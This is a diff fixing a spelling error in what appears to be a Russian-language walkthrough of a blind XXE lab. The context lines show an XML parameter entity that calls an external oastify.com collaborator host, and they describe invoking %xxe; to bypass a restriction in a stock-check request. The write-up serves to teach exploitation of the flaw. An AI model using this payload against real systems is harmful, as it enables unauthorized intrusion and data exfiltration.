@@ -146,7 +146,7 @@ Content-Length: 47
 <!ENTITY % xxe SYSTEM "http://97ehsh4uvk4lq8ooywsdymagr7xzlq9f.oastify.com">
 ```
 
-Затем эта сущность вызывается с помощью `%xxe;`, что позволяет обойти ограниечение. Вот итоговый запрос:
+Затем эта сущность вызывается с помощью `%xxe;`, что позволяет обойти ограничение. Вот итоговый запрос:
 
 ```http
 POST /product/stock HTTP/2
